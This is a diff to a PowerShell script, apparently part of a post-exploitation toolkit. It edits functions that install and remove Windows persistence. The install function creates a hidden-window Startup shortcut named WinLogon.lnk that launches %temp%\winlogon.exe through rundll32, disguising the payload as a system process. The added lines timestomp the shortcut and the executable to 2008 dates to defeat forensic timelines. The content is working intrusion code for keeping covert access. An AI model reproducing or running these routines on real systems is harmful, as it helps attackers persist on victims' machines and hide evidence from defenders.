@@ -202,28 +202,40 @@ Function Install-Persistence
     }
 }
 Function InstallExe-Persistence() {
-        $SourceEXE = "rundll32.exe"
-        $ArgumentsToSourceExe = "shell32.dll,ShellExec_RunDLL %temp%\winlogon.exe"
-        $DestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinLogon.lnk"
-        $WshShell = New-Object -comObject WScript.Shell
-        $Shortcut = $WshShell.CreateShortcut($DestinationPath)
-        $Shortcut.TargetPath = $SourceEXE
-        $Shortcut.Arguments = $ArgumentsToSourceExe
-        $Shortcut.WindowStyle = 7
-        $Shortcut.Save()
-        TimeStomp $DestinationPath "01/03/2008 12:12 pm"
-        If ((Test-Path $DestinationPath) -and (Test-Path "$env:Temp\Winlogon.exe")) {
-            Write-Output "Created StartUp file Exe persistence: $DestinationPath"
+        if (Test-Path "$env:Temp\Winlogon.exe") {
+            $SourceEXE = "rundll32.exe"
+            $ArgumentsToSourceExe = "shell32.dll,ShellExec_RunDLL %temp%\winlogon.exe"
+            $DestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinLogon.lnk"
+            $WshShell = New-Object -comObject WScript.Shell
+            $Shortcut = $WshShell.CreateShortcut($DestinationPath)
+            $Shortcut.TargetPath = $SourceEXE
+            $Shortcut.Arguments = $ArgumentsToSourceExe
+            $Shortcut.WindowStyle = 7
+            $Shortcut.Save()
+            TimeStomp $DestinationPath "01/03/2008 12:12 pm"
+            TimeStomp "$env:Temp\Winlogon.exe" "01/03/2008 12:12 pm"
+            If ((Test-Path $DestinationPath) -and (Test-Path "$env:Temp\Winlogon.exe")) {
+                Write-Output "Created StartUp file Exe persistence: $DestinationPath"
+            } else {
+                Write-Output "Error installing StartUp Exe persistence"
+                Write-Output "Upload EXE to $env:Temp\Winlogon.exe"
+            }
         } else {
             Write-Output "Error installing StartUp Exe persistence"
+            Write-Output "Upload EXE to $env:Temp\Winlogon.exe"
         }
 }
 Function RemoveExe-Persistence() {
         $DestinationPath1 = "$env:Temp\winlogon.exe"
-        Remove-Item -Force $DestinationPath1
+        If (Test-Path $DestinationPath1) {
+            Remove-Item -Force $DestinationPath1
+        }
+        
         $DestinationPath2 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinLogon.lnk"
-        Remove-Item -Force $DestinationPath2
-        TimeStomp $DestinationPath "01/03/2008 12:12 pm"
+        If (Test-Path $DestinationPath2) {
+            Remove-Item -Force $DestinationPath2
+        }
+        
         If ((Test-Path $DestinationPath1) -or ((Test-Path $DestinationPath2))) {
             Write-Output "Unable to Remove Persistence"
         } else {
@@ -726,7 +738,7 @@ elseif ([IntPtr]::size -eq 4) {
 }
 }
 Function TimeStomp($File, $Date) {
-    $file=(gi $file) 
+    $file=(gi $file -force) 
     $file.LastWriteTime=$date;
     $file.LastAccessTime=$date;
     $file.CreationTime=$date;
